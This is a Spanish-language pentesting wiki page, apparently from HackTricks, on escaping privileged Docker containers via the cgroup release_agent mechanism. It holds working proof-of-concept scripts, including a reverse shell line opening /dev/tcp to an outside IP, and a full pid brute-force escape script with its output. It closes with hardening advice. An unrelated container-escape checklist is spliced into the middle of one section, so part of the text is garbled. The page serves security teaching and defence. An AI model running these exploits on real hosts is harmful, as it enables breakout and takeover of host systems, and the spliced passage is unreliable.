# `--privileged` flag

{% code title="PoC inicial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash
 
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="Segundo PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

La bandera `--privileged` introduce preocupaciones significativas de seguridad, y el exploit depende de lanzar un contenedor de Docker con ella habilitada. Al usar esta bandera, los contenedores tienen acceso completo a todos los dispositivos y carecen de restricciones de seccomp, AppArmor y capacidades de Linux.

De hecho, `--privileged` proporciona muchos más permisos de los necesarios para escapar de un contenedor de Docker a través de este método. En realidad, los "únicos" requisitos son:

1. Debemos estar ejecutando como root dentro del contenedor
2. El contenedor debe ejecutarse con la capacidad de Linux `SYS_ADMIN`
3. El contenedor debe carecer de un perfil de AppArmor, o permitir la llamada al sistema `mount`
4. El sistema de archivos virtual cgroup v1 debe estar montado en modo de escritura dentro del contenedor

La capacidad `SYS_ADMIN` permite que un contenedor realice la llamada al sistema `mount` \(ver [man 7 capabilities](https://linux.die.net/man/7/capabilities)\). [Docker inicia los contenedores con un conjunto restringido de capacidades](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) de forma predeterminada y no habilita la capacidad `SYS_ADMIN` debido a los riesgos de seguridad que implica hacerlo.

Además, Docker [inicia los contenedores con la política de AppArmor predeterminada de `docker-default`](https://docs.docker.com/engine/security/apparmor/#understand-the-policies), que [impide el uso de la llamada al sistema `mount`](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) incluso cuando el contenedor se ejecuta con `SYS_ADMIN`.

Un contenedor sería vulnerable a esta técnica si se ejecuta con las banderas: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## Desglosando la prueba de concepto

Ahora que entendemos los requisitos para usar esta técnica y hemos refinado el exploit de prueba de concepto, vamos a recorrerlo línea por línea para demostrar cómo funciona.

Para activar este exploit necesitamos un cgroup donde podamos crear un archivo `release_agent` y activar la invocación de `release_agent` matando todos los procesos en el cgroup. La forma más fácil de lograrlo es montar un controlador de cgroup y crear un cgroup hijo.

Para hacerlo, creamos un directorio `/tmp/cgrp`, montamos el controlador de cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) y creamos un cgroup hijo \(llamado "x" para los fines de este ejemplo\). Aunque no se han probado todos los controladores de cgroup, esta técnica debería funcionar con la mayoría de ellos.

Si está siguiendo y obtiene "mount: /tmp/cgrp: special device cgroup does not exist", es porque su configuración no tiene el controlador de cgroup RDMA. Cambie `rdma` a `memory` para solucionarlo. Estamos usando RDMA porque el PoC original fue diseñado solo para trabajar con él.

Tenga en cuenta que los controladores de cgroup son recursos globales que se pueden montar varias veces con diferentes permisos y los cambios realizados en un montaje se aplicarán a otro.

Podemos ver la creación del cgroup hijo "x" y su listado de directorios a continuación.
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
A continuación, habilitamos las notificaciones de cgroup en la liberación del cgroup "x" escribiendo un 1 en su archivo `notify_on_release`. También establecemos el agente de liberación del cgroup RDMA para ejecutar un script `/cmd` - que crearemos más tarde en el contenedor - escribiendo la ruta del script `/cmd` en el host en el archivo `release_agent`. Para hacerlo, obtendremos la ruta del contenedor en el host desde el archivo `/etc/mtab`.

Los archivos que agregamos o modificamos en el contenedor están presentes en el host, y es posible modificarlos desde ambos mundos: la ruta en el contenedor y su ruta en el host.

Estas operaciones se pueden ver a continuación:
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Ten en cuenta la ruta del script `/cmd`, que vamos a crear en el host:
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
Ahora, creamos el script `/cmd` de tal manera que ejecute el comando `ps aux` y guarde su salida en `/output` en el contenedor especificando la ruta completa del archivo de salida en el host. Al final, también imprimimos el contenido del script `/cmd` para ver su contenido:
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
Finalmente, podemos ejecutar el ataque generando un proceso que finaliza inmediatamente dentro del cgroup hijo "x". Al crear un proceso `/bin/sh` y escribir su PID en el archivo `cgroup.procs` en el directorio del cgroup hijo "x", el script en el host se ejecutará después de que `/bin/sh` salga. La salida de `ps aux` realizada en el host se guarda en el archivo `/output` dentro del contenedor:
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# Bandera `--privileged` v2

Los PoCs anteriores funcionan bien cuando el contenedor está configurado con un controlador de almacenamiento que expone la ruta completa del host del punto de montaje, por ejemplo `overlayfs`. Sin embargo, recientemente me encontré con un par de configuraciones que no revelaban claramente el punto de montaje del sistema de archivos del host.

## Contenedores Kata
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/) monta por defecto el sistema de archivos raíz de un contenedor sobre `9pfs`. Esto no revela información sobre la ubicación del sistema de archivos del contenedor en la Máquina Virtual de Kata Containers.

\* Más información sobre Kata Containers en una futura publicación de blog.

## Device Mapper
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
Vi un contenedor con este montaje raíz en un entorno en vivo, creo que el contenedor se estaba ejecutando con una configuración específica de `devicemapper` como controlador de almacenamiento, pero hasta ahora no he podido replicar este comportamiento en un entorno de prueba.

## Una PoC Alternativa

Obviamente, en estos casos no hay suficiente información para identificar la ruta de los archivos del contenedor en el sistema de archivos del host, por lo que la PoC de Felix no se puede utilizar tal cual. Sin embargo, todavía podemos ejecutar este ataque con un poco de ingenio.

La única pieza clave de información requerida es la ruta completa, relativa al host del contenedor, de un archivo para ejecutar dentro del contenedor. Sin poder discernir esto desde los puntos de montaje dentro del contenedor, tenemos que buscar en otro lugar.

### Proc al rescate <a id="proc-to-the-rescue"></a>

El pseudo-sistema de archivos `/proc` de Linux expone las estructuras de datos del proceso del kernel para todos los procesos que se ejecutan en un sistema, incluidos aquellos que se ejecutan en diferentes espacios de nombres, por ejemplo, dentro de un contenedor. Esto se puede mostrar ejecutando un comando en un contenedor y accediendo al directorio `/proc` del proceso en el host:Contenedor
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
Como un comentario aparte, la estructura de datos `/proc/<pid>/root` me confundió por mucho tiempo, nunca pude entender por qué tener un enlace simbólico a `/` era útil, hasta que leí la definición real en las páginas del manual:

> /proc/\[pid\]/root
>
> UNIX y Linux soportan la idea de un root del sistema de archivos por proceso, establecido por la llamada al sistema chroot\(2\). Este archivo es un enlace simbólico que apunta al directorio raíz del proceso, y se comporta de la misma manera que exe y fd/\*.
>
> Sin embargo, tenga en cuenta que este archivo no es simplemente un enlace simbólico. Proporciona la misma vista del sistema de archivos (incluyendo los espacios de nombres y el conjunto de montajes por proceso) que el propio proceso.

El enlace simbólico `/proc/<pid>/root` se puede utilizar como una ruta relativa del host a cualquier archivo dentro de un contenedor:Container.
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
Esto cambia el requisito del ataque de conocer la ruta completa, en relación al host del contenedor, de un archivo dentro del contenedor, a conocer el pid de _cualquier_ proceso que se esté ejecutando en el contenedor.

### Bash de Pid <a id="pid-bashing"></a>

Esto es en realidad la parte fácil, los ids de proceso en Linux son numéricos y se asignan secuencialmente. El proceso `init` se le asigna el pid `1` y todos los procesos posteriores se les asignan ids incrementales. Para identificar el pid del proceso del host de un proceso dentro de un contenedor, se puede utilizar una búsqueda incremental de fuerza bruta:Container
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Escapando de un contenedor Docker

Si estamos dentro de un contenedor Docker y queremos escapar a la máquina anfitriona, podemos intentar lo siguiente:

1. Verificar si el contenedor tiene acceso al socket de Docker del host:

    ```bash
    ls -la /var/run/docker.sock
    ```

    Si el archivo existe y el contenedor tiene permisos para acceder a él, podemos ejecutar comandos de Docker desde dentro del contenedor que afecten al host.

2. Verificar si el contenedor tiene acceso a los dispositivos del host:

    ```bash
    ls -la /dev | grep -v "tty" | grep -v "pts"
    ```

    Si el contenedor tiene acceso a algún dispositivo, podemos intentar explotar vulnerabilidades en los controladores de dispositivos para obtener acceso al host.

3. Verificar si el contenedor tiene acceso a los archivos del host:

    ```bash
    mount | grep "^/dev" | awk '{print $1}' | xargs -I{} sh -c 'echo "### {} ###"; find $(echo {} | sed "s/\/dev//g") 2>/dev/null'
    ```

    Si el contenedor tiene acceso a algún archivo del host, podemos intentar explotar vulnerabilidades en las aplicaciones que acceden a esos archivos para obtener acceso al host.

4. Verificar si el contenedor tiene acceso a la red del host:

    ```bash
    ip a
    ```

    Si el contenedor tiene acceso a la red del host, podemos intentar explotar vulnerabilidades en los servicios de red del host para obtener acceso al host.

5. Verificar si el contenedor tiene acceso a los servicios de Docker del host:

    ```bash
    docker ps
    ```

    Si el contenedor tiene acceso a los servicios de Docker del host, podemos intentar explotar vulnerabilidades en esos servicios para obtener acceso al host.

6. Verificar si el contenedor tiene acceso a los archivos de configuración del host:

    ```bash
    find / -name "*.conf" -type f -exec grep -l "root" {} \; 2>/dev/null
    ```

    Si el contenedor tiene acceso a algún archivo de configuración del host, podemos intentar explotar vulnerabilidades en las aplicaciones que usan esas configuraciones para obtener acceso al host.

7. Verificar si el contenedor tiene acceso a los archivos de log del host:

    ```bash
    find / -name "*.log" -type f -exec grep -l "root" {} \; 2>/dev/null
    ```

    Si el contenedor tiene acceso a algún archivo de log del host, podemos intentar explotar vulnerabilidades en las aplicaciones que escriben en esos logs para obtener acceso al host.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### Poniéndolo Todo Junto <a id="putting-it-all-together"></a>

Para completar este ataque, se puede utilizar la técnica de fuerza bruta para adivinar el pid para la ruta `/proc/<pid>/root/payload.sh`, con cada iteración escribiendo la ruta pid adivinada en el archivo `release_agent` de los cgroups, activando el `release_agent` y viendo si se crea un archivo de salida.

La única advertencia con esta técnica es que de ninguna manera es sutil y puede aumentar mucho el recuento de pid. Como no se mantienen procesos de larga duración en ejecución, esto _no debería_ causar problemas de confiabilidad, pero no me cites en eso.

El siguiente PoC implementa estas técnicas para proporcionar un ataque más genérico que el presentado por primera vez en el PoC original de Felix para escapar de un contenedor privilegiado utilizando la funcionalidad `release_agent` de los cgroups:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Ejecutar el PoC dentro de un contenedor privilegiado debería proporcionar una salida similar a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Use containers securely

Docker restringe y limita los contenedores por defecto. Aflojar estas restricciones puede crear problemas de seguridad, incluso sin el poder completo de la bandera `--privileged`. Es importante reconocer el impacto de cada permiso adicional y limitar los permisos en general al mínimo necesario.

Para ayudar a mantener los contenedores seguros:

* No use la bandera `--privileged` ni monte un [socket de Docker dentro del contenedor](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). El socket de Docker permite generar contenedores, por lo que es una forma fácil de tomar el control total del host, por ejemplo, ejecutando otro contenedor con la bandera `--privileged`.
* No ejecute como root dentro del contenedor. Use un [usuario diferente](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) o [espacios de nombres de usuario](https://docs.docker.com/engine/security/userns-remap/). El root en el contenedor es el mismo que en el host a menos que se remapee con espacios de nombres de usuario. Solo está ligeramente restringido por, principalmente, los espacios de nombres de Linux, las capacidades y los cgroups.
* [Elimine todas las capacidades](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) y habilite solo las que sean necesarias (`--cap-add=...`). Muchas cargas de trabajo no necesitan capacidades y agregarlas aumenta el alcance de un posible ataque.
* [Use la opción de seguridad "no-new-privileges"](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) para evitar que los procesos obtengan más privilegios, por ejemplo, a través de binarios suid.
* [Limite los recursos disponibles para el contenedor](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Los límites de recursos pueden proteger la máquina de ataques de denegación de servicio.
* Ajuste los perfiles de [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (o SELinux) para restringir las acciones y las llamadas al sistema disponibles para el contenedor al mínimo requerido.
* Use [imágenes oficiales de Docker](https://docs.docker.com/docker-hub/official_images/) o construya las suyas basadas en ellas. No herede ni use imágenes [con puertas traseras](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/).
* Reconstruya regularmente sus imágenes para aplicar parches de seguridad. Esto va sin decir.

# Referencias

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿o quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
